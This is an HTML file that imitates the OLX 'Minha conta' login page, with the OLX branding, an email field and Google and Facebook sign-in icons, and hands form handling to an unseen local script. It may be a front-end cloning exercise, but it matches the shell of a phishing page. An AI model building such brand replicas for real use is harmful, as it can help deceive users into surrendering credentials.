<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charSet="utf-8"/>
    <meta name="theme-color" content="#000000"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <meta name="description" content="OLX - Rápido e Fácil pra comprar e desapegar. Vender e Comprar nunca foi tão fácil! Anuncie Online na OLX - Você tem alguma coisa para desapegar. Desapega!"/>
    <title>Minha conta | OLX</title>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="../img/favicon-16x16.png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz@0,6..12;1,6..12&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/login.css">
</head>
<body>
    <header class="header">
        <nav>
            <div class="logo">
                <img src="assets/img/olx.svg" alt="olx-image">
            </div>
        </nav>
    </header>
    <div class="form-container">
        <h1>Acesse a sua conta</h1>
        <form id="login-form" action="javascript:void(0);">
            <label for="input-field" id="label">E-mail</label>
            <input type="email" id="input-field" placeholder=" " required>
            <button  type="submit" id="button-continue">Continuar</button>
        </form>
        <div class="divider">Ou conecte com</div>
        <div class="social-icons">
            <img src="assets/img/google-icon.png" alt="Google" class="google">
            <img src="assets/img/facebook-icon.png" alt="Facebook" class="facebook">
        </div>
        <div class="help">
            <a href="#">Preciso de ajuda</a>
        </div>
    </div>
    <div class="continuar">
        <p>Ao continuar, você concorda com os <a href="https://ajuda.olx.com.br/s/article/termos-e-condicoes-de-uso">Termos de Uso</a> e a <a href="https://ajuda.olx.com.br/s/article/politica-de-privacidade">Política de Privacidade</a></p>
        <p> da OLX e seus parceiros, e em receber comunicações da OLX.</p>
    </div>
    
    <script src="assets/js/login.js"></script>
</body>
</html>
